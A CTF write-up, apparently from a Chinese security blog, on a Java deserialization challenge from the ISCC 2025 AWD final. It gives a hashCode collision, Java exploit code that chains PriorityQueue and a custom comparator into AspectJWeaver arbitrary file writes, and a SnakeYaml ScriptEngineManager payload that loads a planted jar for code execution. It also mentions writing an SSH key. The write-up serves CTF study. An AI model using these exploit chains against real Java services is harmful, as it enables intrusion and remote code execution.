@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      ISCC_AWD_决赛(2025) Web writeup 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ISCC_AWD_决赛(2025) Web writeup</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-10-22 11:57:39
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="ISCC-AWD-2025-CTF"><a href="#ISCC-AWD-2025-CTF" class="headerlink" title="ISCC_AWD(2025) CTF"></a>ISCC_AWD(2025) CTF</h1><h4 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h4><p>(1) <code>String#hashCode</code>碰撞</p>
+<p>(2) <code>AspectJWeaver</code>任意文件写</p>
+<p>(3) <code>Snakeyaml</code>加载本地<code>jar</code>包</p>
+<p>(4) 内存马</p>
+<p>‍</p>
+<p>题目<code>Jar</code>包给了两个类，分别是<code>Index</code>和<code>User</code>​</p>
+<p><code>Index.class</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Index</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Index</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;server start&quot;</span>);</span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">server</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8095</span>), <span class="number">0</span>);</span><br><span class="line">        server.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        server.setExecutor(Executors.newCachedThreadPool());</span><br><span class="line">        server.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">        MyHandler() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> t.getRequestURI().getQuery();</span><br><span class="line">            Map&lt;String, String&gt; queryMap = <span class="built_in">this</span>.queryToMap(query);</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Welcome to ISCC 2025&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (queryMap != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> (String)queryMap.get(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (Objects.hashCode(token) == <span class="string">&quot;ISCC2025&quot;</span>.hashCode() &amp;&amp; !<span class="string">&quot;ISCC2025&quot;</span>.equals(token)) &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> t.getRequestBody();</span><br><span class="line"></span><br><span class="line">                    String data;</span><br><span class="line">                    String yamlString;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Map&lt;String, String&gt; postData = parsePostData(in);</span><br><span class="line">                        data = (String)postData.get(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">                        yamlString = (String)postData.get(<span class="string">&quot;yaml&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (data != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(data);</span><br><span class="line">                            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">                            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">                            input.readObject();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (yamlString != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">                            yaml.load(yamlString);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                        response = <span class="string">&quot;oops! something is wrong&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    response = <span class="string">&quot;your key is wrong&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">queryToMap</span><span class="params">(String query)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (query == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Map&lt;String, String&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(String param : query.split(<span class="string">&quot;&amp;&quot;</span>)) &#123;</span><br><span class="line">                    String[] entry = param.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (entry.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        result.put(entry[<span class="number">0</span>], entry[<span class="number">1</span>]);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        result.put(entry[<span class="number">0</span>], <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title function_">parsePostData</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">requestBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                requestBody.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Map&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            String[] pairs = requestBody.toString().split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(String pair : pairs) &#123;</span><br><span class="line">                String[] keyValue = pair.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (keyValue.length == <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> URLDecoder.decode(keyValue[<span class="number">0</span>], <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> URLDecoder.decode(keyValue[<span class="number">1</span>], <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    params.put(key, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> params;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>User.class</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, Comparator &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> HashMap hashMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap <span class="title function_">getHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashMap</span><span class="params">(HashMap hashMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hashMap = hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.hashMap != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">m</span> <span class="operator">=</span> <span class="built_in">this</span>.hashMap;</span><br><span class="line">            m.put(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="built_in">this</span>.hashMap.put(o1.toString(), o2.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> User &amp;&amp; o2 <span class="keyword">instanceof</span> User) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> ((User)o1).getName();</span><br><span class="line">            <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> ((User)o2).getName();</span><br><span class="line">            <span class="keyword">return</span> name1.compareTo(name2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="String-hashCode-碰撞"><a href="#String-hashCode-碰撞" class="headerlink" title="String#hashCode 碰撞"></a>String#hashCode 碰撞</h4><p>首先接收<code>key</code>参数的值赋值给<code>token</code>，要求<code>token</code>的<code>hashCode</code>的值等于<code>ISCC2025</code>，但是<code>token</code>字符串的值不能等于<code>ISCC2025</code>，想到进行<code>hashCode</code>碰撞，跟进<code>String#hashCode</code>方法，可以看到对字符串<code>hashCode</code>计算的具体逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">        <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">                h = <span class="number">31</span> * h + val[i];</span><br><span class="line">            &#125;</span><br><span class="line">            hash = h;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ISCC202?</code>和<code>ISCC201?</code>的<code>hashCode</code>值差了1，那么<code>ISCC201?</code>中<code>?</code>的<code>chr</code>值只需要比<code>chr(5)</code>多31即可，<code>chr(5)+31</code>后的字符为<code>T</code>​</p>
+<p>所以<code>&quot;ISCC201T&quot;.hashCode() == &quot;ISCC2025&quot;.hashCode()</code>，碰撞成功。</p>
+<h4 id="AspectJWeaver任意文件写"><a href="#AspectJWeaver任意文件写" class="headerlink" title="AspectJWeaver任意文件写"></a>AspectJWeaver任意文件写</h4><p><code>org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#put</code>方法可以写入任意文件，同时<code>User#compare</code>方法中存在可控的<code>m.put(o1, o2)</code>​</p>
+<p>只需要找到从<code>readObject</code>反序列化-&gt;<code>User#compare</code>的调用链即可</p>
+<p>可以直接用<code>tabby</code>找到链子</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match(sink:Method &#123;NAME:&quot;compare&quot;&#125;)where sink.CLASSNAME=&quot;com.localSnake.utils.User&quot;</span><br><span class="line">match(source:Method &#123;NAME:&quot;readObject&quot;&#125;)&lt;-[:HAS]-(class:Class &#123;IS_PUBLIC:true&#125;)</span><br><span class="line">CALL tabby.algo.findJavaGadget(source, &quot;&gt;&quot;, sink, 5, false) YIELD path</span><br><span class="line">return path limit 1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251021234752-laezv1r.png" alt="image-20251021234752-laezv1r"></p>
+<p>其实这就是<code>CC4</code>链子的前半段</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251021234913-erezjmv.png" alt="image-20251021234913-erezjmv"></p>
+<p>可以直接考虑利用 <code>CC4</code>(前半段) + <code>AspectJWeaver</code> 写 <code>ssh</code> 公钥，直接<code>ssh</code>连接上私地了 -&gt; 一种非预期解。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.UtilFunctions;</span><br><span class="line"><span class="keyword">import</span> com.localSnake.utils.User;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> UtilFunctions.AspectJWrite(<span class="string">&quot;/tmp&quot;</span>);</span><br><span class="line">        user.setHashMap(map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//user.compare(&quot;test.txt&quot;, &quot;123&quot;.getBytes());</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>();</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, user);</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;test2.txt&quot;</span>, <span class="string">&quot;123&quot;</span>.getBytes()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serData = UtilFunctions.serialize(priorityQueue);</span><br><span class="line">        UtilFunctions.deserialize(serData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>预期解思路是写入恶意<code>jar</code>文件，然后利用<code>snakeYaml</code>反序列化去本地加载恶意<code>jar</code>实现<code>RCE</code>​</p>
+<p>写入恶意<code>jar</code>​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> UtilFunctions.AspectJWrite(<span class="string">&quot;/tmp&quot;</span>);</span><br><span class="line">        user.setHashMap(map);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>();</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, user);</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        UtilFunctions.setValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;test2.txt&quot;</span>, Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/gehansheng/Desktop/CTF/ISCC2025-AWD国决/ISCC2025/src/main/java/yaml-payload.jar&quot;</span>))&#125;);</span><br><span class="line">        <span class="type">byte</span>[] serData = UtilFunctions.serialize(priorityQueue);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serData));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251022110542-4ef8k9e.png" alt="image-20251022110542-4ef8k9e"></p>
+<p>‍</p>
+<h4 id="Snakeyaml-SPI-加载本地恶意jar"><a href="#Snakeyaml-SPI-加载本地恶意jar" class="headerlink" title="Snakeyaml SPI 加载本地恶意jar"></a>Snakeyaml SPI 加载本地恶意jar</h4><p>利用<code>SnakeYaml</code>反序列化打<code>ScriptEngineManager</code>加载本地恶意<code>jar</code>​</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;file:///tmp/yaml-payload.jar&quot;</span>]]]]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251022110845-47zkyrr.png" alt="image-20251022110845-47zkyrr"></p>
+<p>也可以直接打内存马。</p>
+<p>‍</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>题目考点质量很高，不能局限于某一种思路，比赛时总在想如何利用<code>Snakeyaml</code>从而忽略了题目给的<code>readObject</code>。</p>
+<p>‍</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-10-22 11:57:39
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
